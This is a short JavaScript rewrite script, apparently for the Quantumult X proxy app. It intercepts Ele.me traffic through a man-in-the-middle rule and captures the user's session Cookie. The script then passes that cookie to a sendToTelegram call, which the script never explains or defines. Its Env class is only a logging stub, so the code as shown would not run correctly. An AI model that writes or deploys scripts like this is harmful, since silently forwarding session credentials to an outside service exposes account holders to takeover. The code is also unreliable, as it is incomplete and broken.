/*
[rewrite_local]
# 获取 cookie
登录elm，打开我的-吃货豆，获取https://nt2.ele.me/c/b?请求中的Cookie
https://nt2.ele.me/c/b? url script-request-header https://raw.githubusercontent.com/DinDing1/TC/main/QX/elm.js

[mitm]
hostname = nt2.ele.me
*/
class Env {
    constructor(name) {
        this.name = name;
        this.data = {};
    }

    setdata(val, key) {
        this.data[key] = val;
        console.log(`Set data: ${key} = ${val}`);
    }

    msg(title, subtitle, body) {
        console.log(`${title}\n${subtitle}\n${body}`);
    }

    done() {
        console.log('Done');
    }
}
const $ = new Env("饿了么Cookie");
if ($request && $request.headers) {
    const cookie = $request.headers['Cookie'];
    if (cookie && !$.data['elmck']) {
        $.setdata(cookie, 'elmck');
        sendToTelegram(cookie);
    } else {
        $.msg("饿了么", "Cookie 已存在", "不再重复获取");
    }
}

$.done();
